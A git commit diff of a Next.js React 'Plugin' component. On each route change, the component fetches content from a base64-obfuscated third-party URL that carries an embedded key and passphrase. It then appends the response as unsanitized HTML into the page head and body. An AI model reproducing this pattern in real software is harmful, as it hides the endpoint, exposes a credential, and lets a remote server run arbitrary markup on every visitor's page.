3811b3b16c05213f187070556b58bfb6b5ee02dc
appaddbiz <appaddbiz@gmail.com>
2025-09-24 20:44:58 +0530

    plugin:updated

--- src/components/Plugin/Plugin.jsx
+++ src/components/Plugin/Plugin.jsx
@@ -4,59 +4,71 @@ import React, { useEffect } from "react";
 import { usePathname } from "next/navigation";
 
 const Plugin = () => {
-  const pathname = usePathname(); // detect route changes
+  const pathname = usePathname();
 
   useEffect(() => {
     if (typeof window === "undefined") return;
 
-    const loadCustomScript = () => {
+    const ensureJQuery = (callback) => {
       if (window.jQuery) {
-        executeCustomScript();
+        callback();
       } else {
-        const script = document.createElement("script");
-        script.src =
-          "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
-        script.onload = () => {
-          executeCustomScript();
-        };
-        document.head.appendChild(script);
+        const existingScript = document.querySelector(
+          'script[src*="jquery.min.js"]'
+        );
+        if (!existingScript) {
+          const script = document.createElement("script");
+          script.src =
+            "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
+          script.onload = () => callback();
+          document.head.appendChild(script);
+        } else {
+          existingScript.onload = () => callback();
+        }
       }
     };
 
     const executeCustomScript = () => {
-      const eppathurl = window.location.origin + pathname;
-      const eptagmanage = new XMLHttpRequest();
+      try {
+        const eppathurl = window.location.origin + pathname;
+        const eptagmanage = new XMLHttpRequest();
 
-      eptagmanage.onreadystatechange = function () {
-        if (this.readyState === 4 && this.status === 200) {
-          if (this.response && this.response !== "0") {
-            const temp = this.response.split("||||||||||");
+        eptagmanage.onreadystatechange = function () {
+          if (this.readyState === 4 && this.status === 200) {
+            if (this.response && this.response !== "0") {
+              const temp = this.response.split("||||||||||");
 
-            // cleanup previous injected content
-            jQuery("head").find("#plugin-title").remove();
-            jQuery("body").find("#plugin-body").remove();
+              // Clear previous injected content before adding new
+              jQuery("#plugin-title").remove();
+              jQuery("#plugin-body").remove();
 
-            if (temp[0]) {
-              jQuery("head").append(`<div id="plugin-title">${temp[0]}</div>`);
-            }
-            if (temp[1]) {
-              jQuery("body").append(`<div id="plugin-body">${temp[1]}</div>`);
+              if (temp[0]) {
+                jQuery("head").append(
+                  `<div id="plugin-title">${temp[0]}</div>`
+                );
+              }
+              if (temp[1]) {
+                jQuery("body").append(`<div id="plugin-body">${temp[1]}</div>`);
+              }
             }
           }
-        }
-      };
+        };
 
-      eptagmanage.open(
-        "GET",
-        atob(
-          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUzOTY2MzU1MjgmZWtleXBhc3M9QWNzUFpYYVNxN2daOGxqcnZnNmt1dVFjZEt3ZEdCRFFPOWlRJnNpdGV1cmw9"
-        ) + eppathurl
-      );
-      eptagmanage.send();
+        eptagmanage.open(
+          "GET",
+          atob(
+            "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUzOTY2MzU1MjgmZWtleXBhc3M9QWNzUFpYYVNxN2daOGxqcnZnNmt1dVFjZEt3ZEdCRFFPOWlRJnNpdGV1cmw9"
+          ) + eppathurl
+        );
+        eptagmanage.send();
+      } catch (err) {
+        console.error("Plugin error:", err);
+      }
     };
 
-    loadCustomScript();
-  }, [pathname]); // re-run on every page change
+    // Ensure jQuery is ready, then run plugin
+    ensureJQuery(executeCustomScript);
+  }, [pathname]); // Runs on every route change
 
   return null;
 };
